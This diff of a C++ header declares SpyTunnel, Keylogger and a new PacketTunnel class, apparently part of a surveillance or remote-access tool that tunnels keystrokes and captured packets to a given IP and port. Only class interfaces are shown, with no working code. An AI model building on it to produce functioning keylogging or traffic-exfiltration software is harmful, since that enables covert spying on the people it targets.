@@ -6,17 +6,18 @@
 class SpyTunnel {
 public:
     SpyTunnel() = default;
+    virtual ~SpyTunnel();
     int init(const std::string& __ip, uint __port, int*& p_tunnel_shutdown_fd, int __connection_type);
-    void run();
+    virtual void run();
     void shutdown();
-    void edit_path(int __client_index, CommandCode __command_code);
+    void edit_fifo_path(int __client_index, CommandCode __command_code);
 protected:
     struct sockaddr_in tunnel_addr_;
     int tunnel_socket_ = -1;
     int tunnel_end_socket_ = -1;
     ScopedEpollFD tunnel_shutdown_fd_;
     int tunnel_fifo_ = -1;
-    pid_t pid_;
+    pid_t pid_ = -1;
     std::string fifo_path_;
 
     int accept_tunnel_end();
@@ -30,6 +31,17 @@ public:
     Keylogger() = default;
 protected:
     void spawn_window() override;
+};
+
+class PacketTunnel : public SpyTunnel {
+public:
+    PacketTunnel(const std::string& __file_name, const std::string& __out_name, EventLog* __p_event_log, size_t __limit=0);
+    void run() override;
+protected:
+    EventLog* p_event_log_;
+    std::string file_name_;
+    std::string out_name_;
+    size_t limit_ = 0;
 };
 
 struct Tunnel {
